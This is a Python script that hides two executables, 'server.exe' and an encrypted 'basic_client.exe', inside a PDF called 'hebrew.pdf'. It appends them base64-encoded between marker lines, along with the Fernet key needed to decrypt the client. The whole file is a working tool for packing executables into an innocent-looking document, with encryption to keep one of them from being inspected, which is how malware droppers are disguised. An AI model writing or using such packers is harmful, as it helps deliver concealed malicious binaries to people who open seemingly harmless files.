from cryptography.fernet import Fernet
import base64
import secrets
import os

def generate_key():
   random_part = secrets.token_bytes(28)
   key = b"DZDZ" + random_part
   return base64.urlsafe_b64encode(key)

def encrypt_file(file_path, key):
   f = Fernet(key)
   with open(file_path, 'rb') as file:
       return f.encrypt(file.read())

def append_data_to_pdf(pdf_path, data, identifier):
    try:
        with open(pdf_path, 'rb') as f:
            original_content = f.read()
        
        with open(pdf_path, 'wb') as f:
            f.write(original_content)
            f.write(f"\n%%{identifier}%%\n".encode())
            f.write(base64.b64encode(data))
            f.write(f"\n%%END{identifier}%%\n".encode())
    except Exception as e:
        print(f"Error appending to PDF: {e}")
        raise

def hide_exes_in_pdf(pdf_path, server_exe, client_exe):
   # Read server executable
   with open(server_exe, 'rb') as f:
       server_data = f.read()
   
   # Read and encrypt client executable
   key = generate_key()
   encrypted_client = encrypt_file(client_exe, key)
   
   # Append to PDF in order: server -> key -> encrypted client
   append_data_to_pdf(pdf_path, server_data, 'SERVER_EXE')
   append_data_to_pdf(pdf_path, key, 'ENCRYPTION_KEY')
   append_data_to_pdf(pdf_path, encrypted_client, 'ENCRYPTED_CLIENT')
   
   return key.decode()

def main():
   pdf_path = "hebrew.pdf"
   server_exe = "server.exe"
   client_exe = "basic_client.exe"

   if not all(os.path.exists(p) for p in [pdf_path, server_exe, client_exe]):
       print("One or more files not found")
       return

   try:
       key = hide_exes_in_pdf(pdf_path, server_exe, client_exe)
       print(f"Files hidden successfully")
       print(f"Encryption key: {key}")
   except Exception as e:
       print(f"Error: {e}")

if __name__ == "__main__":
   main()